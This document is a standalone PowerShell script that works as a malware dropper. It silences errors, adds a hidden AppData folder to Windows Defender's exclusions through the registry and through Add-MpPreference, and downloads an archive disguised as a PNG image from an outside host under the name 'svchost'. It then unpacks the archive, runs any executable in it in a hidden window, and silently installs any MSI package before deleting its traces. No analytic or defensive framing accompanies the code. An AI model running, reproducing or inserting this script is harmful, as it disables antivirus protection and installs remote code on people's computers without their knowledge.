$ErrorActionPreference='SilentlyContinue'
$excludePath = "$env:APPDATA\Microsoft\Windows\Caches"
New-Item -Path $excludePath -ItemType Directory -Force | Out-Null
try { $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"; if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }; Set-ItemProperty -Path $regPath -Name $excludePath -Value 0 -Type DWord -Force } catch {}
try { Add-MpPreference -ExclusionPath $excludePath -ErrorAction SilentlyContinue } catch {}
$u="https://cloud-sharing.com/service.png";$z="$excludePath\svchost.png";$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');$w.Proxy=[System.Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[System.Net.CredentialCache]::DefaultCredentials;for($i=0;$i -lt 5;$i++){try{$w.DownloadFile($u,$z);if(Test-Path $z){break}}catch{Start-Sleep ([Math]::Min($i*2,10))}};if(-not(Test-Path $z)){exit};try{[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')|Out-Null;[System.IO.Compression.ZipFile]::ExtractToDirectory($z,$excludePath)}catch{$sh=New-Object -ComObject Shell.Application;$sh.Namespace($excludePath).CopyHere($sh.Namespace($z).Items(),16);Start-Sleep 3};$x=Get-ChildItem $excludePath -Filter *.exe -Recurse|Select-Object -First 1;$m=Get-ChildItem $excludePath -Filter *.msi -Recurse|Select-Object -First 1;if($x){Start-Process $x.FullName -WindowStyle Hidden};if($m){$msiArgs="/i `"$($m.FullName)`" /quiet /norestart";Start-Process msiexec.exe -ArgumentList $msiArgs -Wait};Remove-Item $z -Force -ErrorAction SilentlyContinue